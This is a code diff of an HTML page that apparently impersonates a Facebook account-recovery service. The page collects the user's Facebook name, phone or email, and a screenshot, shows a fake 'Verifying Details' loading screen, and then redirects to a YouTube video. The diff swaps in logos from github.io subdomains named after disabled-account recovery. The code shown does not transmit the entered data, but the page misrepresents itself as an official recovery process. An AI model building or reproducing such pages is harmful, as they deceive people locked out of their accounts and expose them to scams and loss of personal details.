@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Form</title>
+    <title>Support Dashboard</title>
     <style>
-        /* General Body Styling */
+        /* General Setup */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #f0f2f5;
@@ -14,38 +14,53 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden; /* Prevents scrollbars during loading */
+            overflow: hidden;
         }
 
-        /* Form Container - Mobile Optimized */
+        /* Main Form Container */
         .container {
             background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            width: 90%; /* Takes 90% of screen on mobile */
-            max-width: 400px; /* Won't get too big on PC */
+            padding: 25px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 90%; 
+            max-width: 380px; 
             text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Top Logo Styling */
+        .top-logo {
+            width: 70px; /* Adjust size here */
+            height: auto;
+            margin-bottom: 15px;
         }
 
         .highlight-title {
             color: #d32f2f;
-            font-size: 1.2rem;
-            font-weight: bold;
-            margin-bottom: 15px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            width: 100%;
             border-bottom: 1px solid #eee;
             padding-bottom: 10px;
         }
 
-        /* Input Fields Styling */
+        /* Form Inputs */
+        form {
+            width: 100%;
+        }
+
         input[type="text"], input[type="email"], input[type="file"] {
             width: 100%;
             padding: 12px;
             margin: 8px 0;
-            border: 1px solid #ddd;
+            border: 1px solid #ccc;
             border-radius: 6px;
             box-sizing: border-box;
-            font-size: 16px; /* Prevents zoom on iPhone */
+            font-size: 15px;
         }
 
         label {
@@ -53,16 +68,16 @@
             text-align: left;
             margin-top: 10px;
             font-weight: 600;
-            font-size: 14px;
-            color: #333;
+            font-size: 13px;
+            color: #444;
         }
 
-        /* Glowing Button Styles */
+        /* Button Styling */
         #proceedBtn {
-            background-color: #00e600; /* Bright Green */
+            background-color: #00e600;
             color: #000;
-            font-weight: bold;
-            font-size: 18px;
+            font-weight: 800;
+            font-size: 16px;
             padding: 14px;
             width: 100%;
             border: none;
@@ -80,87 +95,85 @@
             to { box-shadow: 0 0 20px #00e600; }
         }
 
-        /* LOADING OVERLAY STYLES */
+        /* LOADING SCREEN OVERLAY */
         #loadingOverlay {
-            display: none; /* Hidden by default */
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(255, 255, 255, 0.95);
-            z-index: 9999;
+            background-color: rgba(255, 255, 255, 0.98);
+            z-index: 10000;
             flex-direction: column;
             justify-content: center;
             align-items: center;
         }
 
-        /* Blinking Logo Animation */
+        /* Blinking Logo in Center */
         .blink-logo {
-            width: 80px; /* Logo size */
+            width: 80px;
             height: auto;
             animation: blinker 1s linear infinite;
         }
 
         @keyframes blinker {
-            50% {
-                opacity: 0;
-            }
+            50% { opacity: 0.3; }
         }
 
         .loading-text {
             margin-top: 20px;
-            font-size: 18px;
-            color: #555;
-            font-weight: bold;
+            font-size: 16px;
+            color: #666;
+            font-weight: 500;
         }
     </style>
 </head>
 <body>
 
-    <div class="container" id="mainForm">
+    <div class="container">
+        <img src="https://fbdisabled.github.io/recovery/logo.png" alt="Logo" class="top-logo">
+
         <div class="highlight-title">
-            Account Recovery Assistance
+            Disable Suspended Recovery
         </div>
 
         <form onsubmit="event.preventDefault(); startProcess();">
             
-            <label for="idName">Account Name</label>
-            <input type="text" id="idName" placeholder="Full Name" required>
+            <label>Facebook ID Name</label>
+            <input type="text" placeholder="Full Name" required>
 
-            <label for="contact">Mobile or Email</label>
-            <input type="text" id="contact" placeholder="Enter details" required>
+            <label>Mobile number or email</label>
+            <input type="text" placeholder="Contact Info" required>
 
-            <label for="screenshot">Upload Screenshot</label>
-            <input type="file" id="screenshot" accept="image/*" required>
+            <label>Screenshot</label>
+            <input type="file" accept="image/*" required>
 
             <button type="submit" id="proceedBtn">Proceed</button>
         </form>
     </div>
 
     <div id="loadingOverlay">
-        <img src="https://fbunlokpanel.github.io/disable_recovery/logo.png" alt="Loading Logo" class="blink-logo">
-        <div class="loading-text">Processing...</div>
+        <img src="https://fbdisabled.github.io/recovery/logo.png" alt="Processing" class="blink-logo">
+        <div class="loading-text">Verifying Details...</div>
     </div>
 
     <script>
         function startProcess() {
-            // 1. Hide the keyboard on mobile (by blurring active element)
+            // Hide keyboard on mobile
             if (document.activeElement) {
                 document.activeElement.blur();
             }
 
-            // 2. Show the loading overlay
-            const overlay = document.getElementById('loadingOverlay');
-            overlay.style.display = 'flex';
+            // Show loading screen
+            document.getElementById('loadingOverlay').style.display = 'flex';
 
-            // 3. Set timer for redirect (3000ms = 3 seconds, roughly 2-3 blinks)
+            // Redirect after 3 seconds
             setTimeout(function() {
                 window.location.href = "https://youtu.be/66aXzfOHMK4?si=D9w3D67MgTqu1pZy";
-            }, 3000); 
+            }, 3000);
         }
     </script>
 
 </body>
 </html>
-
